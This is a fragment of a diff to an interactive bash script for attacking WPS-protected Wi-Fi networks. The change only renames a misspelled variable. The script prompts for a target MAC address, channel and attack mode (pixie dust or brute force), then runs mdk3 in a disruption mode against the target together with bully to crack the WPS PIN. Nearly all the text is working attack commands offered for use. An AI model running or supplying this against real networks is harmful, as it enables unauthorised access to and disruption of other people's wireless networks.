@@ -28,5 +28,5 @@ read mac
 echo "what is the channel the target are using ?"
 read channel
 printf 'what is wps attack method? if dust_attack  choose (-d) and if wps brute force choose (-B) default  is -B '
-read  metoud
-terminator  -e "mdk3 $WLAN  m -t $mac    -c $channel  | bully -b $mac  -v 3 -C -F -M  $metoud   $WLAN -c $channel"
+read  method
+terminator  -e "mdk3 $WLAN  m -t $mac    -c $channel  | bully -b $mac  -v 3 -C -F -M  $method   $WLAN -c $channel"
